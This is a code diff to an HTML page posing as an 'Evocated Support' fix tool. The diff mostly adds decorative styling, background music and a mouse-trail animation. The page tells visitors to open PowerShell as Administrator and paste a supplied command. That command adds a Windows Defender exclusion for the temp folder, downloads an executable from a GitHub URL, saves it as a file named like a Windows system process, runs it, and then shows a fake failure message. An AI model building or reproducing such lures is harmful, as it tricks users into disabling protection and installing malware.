@@ -10,17 +10,11 @@
       padding: 0;
       font-family: 'Arial', sans-serif;
       height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      color: white;
-
-      /* 🌌 Animated gradient background */
       background: linear-gradient(-45deg, #000000, #1a1a1a, #333333, #000000);
       background-size: 400% 400%;
       animation: gradientFlow 15s ease infinite;
+      color: white;
+      overflow: hidden;
     }
 
     @keyframes gradientFlow {
@@ -29,11 +23,44 @@
       100% { background-position: 0% 50%; }
     }
 
+    .container {
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
     h1 {
       font-size: 3rem;
       color: #00ffcc;
       text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
       margin-bottom: 10px;
+      position: relative;
+    }
+
+    .icon {
+      font-size: 1.5rem;
+      position: absolute;
+      animation: bounce 2s infinite;
+    }
+
+    .icon.gear {
+      left: -40px;
+      top: -10px;
+    }
+
+    .icon.wrench {
+      right: -40px;
+      top: -10px;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
     }
 
     p {
@@ -52,10 +79,24 @@
       cursor: pointer;
       box-shadow: 0 0 15px #ff007f;
       transition: background 0.3s ease;
+      position: relative;
     }
 
     .btn:hover {
       background-color: #e6006b;
+    }
+
+    .btn .icon {
+      bottom: -30px;
+      left: 50%;
+      transform: translateX(-50%);
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: translateX(-50%) scale(1); }
+      50% { transform: translateX(-50%) scale(1.2); }
+      100% { transform: translateX(-50%) scale(1); }
     }
 
     #hiddenContent {
@@ -65,11 +106,12 @@
 
     #copyText {
       background: #111;
-      padding: 10px 20px;
+      padding: 8px 15px;
       border-radius: 5px;
       margin-bottom: 10px;
-      font-size: 1rem;
-      word-break: break-all;
+      font-size: 0.9rem;
+      word-break: break-word;
+      max-width: 90vw;
     }
 
     #copyBtn {
@@ -86,17 +128,39 @@
     #copyBtn:hover {
       background-color: #00dd99;
     }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
+  <audio id="bgMusic" src="nights.mp3" autoplay loop></audio>
 
-  <h1>⚙️ Evocated Support</h1>
-  <p>You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.</p>
-  <button class="btn" onclick="showText()">Fix Now</button>
+  <canvas id="trailCanvas"></canvas>
 
-  <div id="hiddenContent">
-    <div id="copyText">Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red</div>
-    <button id="copyBtn" onclick="copyText()">Copy to Clipboard</button>
+  <div class="container">
+    <h1>
+      <span class="icon gear">⚙️</span>
+      Evocated Support
+      <span class="icon wrench">🔧</span>
+    </h1>
+
+    <p>You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.</p>
+
+    <button class="btn" onclick="showText()">
+      Fix Now
+      <span class="icon">🛠️</span>
+    </button>
+
+    <div id="hiddenContent">
+      <div id="copyText">Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red</div>
+      <button id="copyBtn" onclick="copyText()">Copy to Clipboard</button>
+    </div>
   </div>
 
   <script>
@@ -106,19 +170,56 @@
 
     function copyText() {
       const text = document.getElementById('copyText').innerText;
-
-      if (!navigator.clipboard) {
-        alert("Clipboard not supported in this browser.");
-        return;
-      }
-
       navigator.clipboard.writeText(text).then(() => {
         alert("✅ Copied to clipboard!");
-      }).catch((err) => {
-        console.error(err);
-        alert("❌ Clipboard copy failed. Please allow clipboard access or try manually.");
+      }).catch(err => {
+        alert("❌ Clipboard copy failed. Please try manually.");
       });
     }
+
+    // Mouse Trail Canvas
+    const canvas = document.getElementById("trailCanvas");
+    const ctx = canvas.getContext("2d");
+    let width = canvas.width = window.innerWidth;
+    let height = canvas.height = window.innerHeight;
+    let particles = [];
+
+    window.addEventListener("resize", () => {
+      width = canvas.width = window.innerWidth;
+      height = canvas.height = window.innerHeight;
+    });
+
+    document.addEventListener("mousemove", e => {
+      for (let i = 0; i < 3; i++) {
+        particles.push({
+          x: e.clientX,
+          y: e.clientY,
+          alpha: 1,
+          size: Math.random() * 4 + 1,
+          speedX: (Math.random() - 0.5) * 2,
+          speedY: (Math.random() - 0.5) * 2
+        });
+      }
+    });
+
+    function animate() {
+      ctx.clearRect(0, 0, width, height);
+      particles.forEach((p, i) => {
+        p.x += p.speedX;
+        p.y += p.speedY;
+        p.alpha -= 0.02;
+        if (p.alpha <= 0) particles.splice(i, 1);
+        else {
+          ctx.globalAlpha = p.alpha;
+          ctx.fillStyle = "white";
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+          ctx.fill();
+        }
+      });
+      requestAnimationFrame(animate);
+    }
+    animate();
   </script>
 </body>
 </html>
